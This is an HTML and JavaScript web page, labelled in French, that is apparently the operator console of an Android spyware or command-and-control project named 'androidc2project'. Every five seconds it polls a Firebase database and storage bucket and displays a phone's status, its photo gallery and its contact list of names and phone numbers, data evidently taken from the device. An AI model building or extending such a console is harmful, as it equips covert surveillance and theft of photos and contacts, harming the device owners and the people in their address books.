<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #0f0f23; color: #fff; padding: 20px; }
        h1 { text-align: center; margin-bottom: 20px; color: #00ff88; }
        .stats { display: flex; gap: 15px; justify-content: center; margin-bottom: 25px; flex-wrap: wrap; }
        .stat-box { background: #1a1a3e; padding: 15px 25px; border-radius: 10px; text-align: center; min-width: 120px; }
        .stat-box h3 { font-size: 14px; color: #888; }
        .stat-box p { font-size: 28px; font-weight: bold; color: #00ff88; }
        .section { margin-bottom: 30px; }
        .section h2 { color: #ffcc00; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
        .gallery-grid img { width: 100%; height: 200px; object-fit: cover; border-radius: 8px; border: 2px solid #333; cursor: pointer; }
        .gallery-grid img:hover { border-color: #00ff88; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #1a1a3e; color: #ffcc00; }
        tr:hover { background: #1a1a3e; }
        .status { text-align: center; padding: 10px; background: #1a1a3e; border-radius: 8px; margin-bottom: 20px; }
        .status.ok { border-left: 4px solid #00ff88; }
        .status.err { border-left: 4px solid #ff4444; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 999; }
        .modal img { max-width: 90%; max-height: 90%; }
        .modal .close { position: absolute; top: 20px; right: 30px; color: #fff; font-size: 40px; cursor: pointer; }
        @media (max-width: 600px) { .gallery-grid { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
    <h1>📱 Android Dashboard</h1>
    <div class="stats">
        <div class="stat-box"><h3>Photos</h3><p id="photoCount">0</p></div>
        <div class="stat-box"><h3>Contacts</h3><p id="contactCount">0</p></div>
        <div class="stat-box"><h3>Statut</h3><p id="statusText">...</p></div>
    </div>
    <div class="status" id="statusBar">En attente des données...</div>

    <div class="section">
        <h2>📸 Galerie</h2>
        <div class="gallery-grid" id="gallery"></div>
    </div>

    <div class="section">
        <h2>👤 Contacts</h2>
        <table><thead><tr><th>#</th><th>Nom</th><th>Téléphone</th></tr></thead><tbody id="contacts"></tbody></table>
    </div>

    <div class="modal" id="imageModal" onclick="closeModal()">
        <span class="close">&times;</span>
        <img id="modalImage">
    </div>

    <script>
        const DB_URL = "https://androidc2project-default-rtdb.firebaseio.com";
        const STORAGE_URL = "https://firebasestorage.googleapis.com/v0/b/androidc2project.appspot.com/o";

        function openModal(src) { document.getElementById("modalImage").src = src; document.getElementById("imageModal").style.display = "flex"; }
        function closeModal() { document.getElementById("imageModal").style.display = "none"; }

        async function loadData() {
            try {
                // Statut
                let res = await fetch(DB_URL + "/status.json");
                let status = await res.json();
                let bar = document.getElementById("statusBar");
                if (status) { bar.textContent = status; bar.className = "status ok"; }
                document.getElementById("statusText").textContent = status || "...";

                // Gallery metadata
                res = await fetch(DB_URL + "/gallery.json");
                let gallery = await res.json();
                let galleryDiv = document.getElementById("gallery");
                galleryDiv.innerHTML = "";
                let count = 0;

                if (gallery) {
                    let keys = Object.keys(gallery).sort((a,b) => parseInt(b) - parseInt(a));
                    for (let key of keys) {
                        let item = gallery[key];
                        let imgSrc = STORAGE_URL + "/gallery%2F" + encodeURIComponent(item.filename || ("img_" + key + ".jpg")) + "?alt=media";
                        let div = document.createElement("div");
                        let img = document.createElement("img");
                        img.src = imgSrc;
                        img.onerror = function() {
                            // Fallback: afficher le base64
                            if (item.data && item.data.length > 100) {
                                this.src = "data:image/jpeg;base64," + item.data;
                            } else {
                                this.src = ""; this.alt = "Image indisponible";
                                this.style.opacity = "0.3";
                            }
                        };
                        img.onclick = function() { openModal(this.src); };
                        div.appendChild(img);
                        galleryDiv.appendChild(div);
                        count++;
                    }
                }
                document.getElementById("photoCount").textContent = count;

                // Contacts
                res = await fetch(DB_URL + "/contacts.json");
                let contacts = await res.json();
                let tbody = document.getElementById("contacts");
                tbody.innerHTML = "";
                let ccount = 0;
                if (contacts) {
                    for (let key in contacts) {
                        let c = contacts[key];
                        let tr = document.createElement("tr");
                        tr.innerHTML = "<td>" + (parseInt(key)+1) + "</td><td>" + (c.name || "Inconnu") + "</td><td>" + (c.phone || "-") + "</td>";
                        tbody.appendChild(tr);
                        ccount++;
                    }
                }
                document.getElementById("contactCount").textContent = ccount;

            } catch(e) {
                document.getElementById("statusBar").textContent = "Erreur: " + e.message;
                document.getElementById("statusBar").className = "status err";
            }
        }

        loadData();
        setInterval(loadData, 5000);
    </script>
</body>
</html>
